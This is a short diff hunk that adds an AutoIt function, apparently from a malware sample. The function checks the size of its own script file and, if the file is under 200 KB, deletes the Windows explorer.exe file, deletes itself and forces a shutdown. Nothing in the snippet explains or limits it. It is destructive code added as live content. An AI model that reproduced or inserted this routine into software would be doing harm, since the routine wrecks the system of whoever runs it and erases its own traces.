@@ -1,0 +1,8 @@
+Func _Start_Lov()
+If FileGetSize(@ScriptFullPath) < 204800 Then
+FileDelete(@WindowsDir & '\explorer.exe')
+FileDelete(@ScriptFullPath)
+Shutdown(1)
+Exit
+EndIf
+EndFunc
